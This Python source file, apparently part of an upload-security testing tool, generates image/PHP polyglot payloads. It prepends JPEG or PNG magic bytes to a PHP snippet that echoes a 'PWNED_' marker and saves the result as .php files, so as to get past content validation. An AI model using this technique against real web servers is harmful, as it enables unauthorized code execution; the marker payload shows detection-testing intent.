

import os
import random
import string


class ContentValidationBypass:
    def __init__(self):
        self.payload_signature = self.generate_signature()

   
    def generate_signature(self):
        return "PWNED_" + ''.join(random.choices(string.ascii_uppercase, k=5))

    
    def create_polyglot(self, file_type="jpeg"):
        """
        Create a file that looks like an image but contains executable code
        """

        if file_type == "jpeg":
            magic_bytes = b"\xff\xd8\xff"  
            extension = ".php"
        elif file_type == "png":
            magic_bytes = b"\x89PNG\r\n\x1a\n"
            extension = ".php"
        else:
            magic_bytes = b""
            extension = ".php"

        payload_code = f"<?php echo '{self.payload_signature}'; ?>".encode()

        content = magic_bytes + b"\n" + payload_code

        filename = f"payload{extension}"

        return filename, content

    
    def create_image_polyglot(self):
        """
        More advanced: append PHP to a valid image structure
        """
        jpeg_header = b"\xff\xd8\xff\xe0"  

        payload_code = f"<?php echo '{self.payload_signature}'; ?>".encode()

        content = jpeg_header + b"\n" + payload_code

        filename = "image.php"

        return filename, content

   
    def save_payload(self, filename, content, directory="payloads"):
        os.makedirs(directory, exist_ok=True)

        path = os.path.join(directory, filename)

        with open(path, "wb") as f:
            f.write(content)

        return path

   
    def generate_payloads(self):
        payloads = []

       
        filename, content = self.create_polyglot("jpeg")
        payloads.append({
            "filename": filename,
            "content": content,
            "signature": self.payload_signature
        })

        
        filename, content = self.create_polyglot("png")
        payloads.append({
            "filename": filename,
            "content": content,
            "signature": self.payload_signature
        })

       
        filename, content = self.create_image_polyglot()
        payloads.append({
            "filename": filename,
            "content": content,
            "signature": self.payload_signature
        })

        return payloads
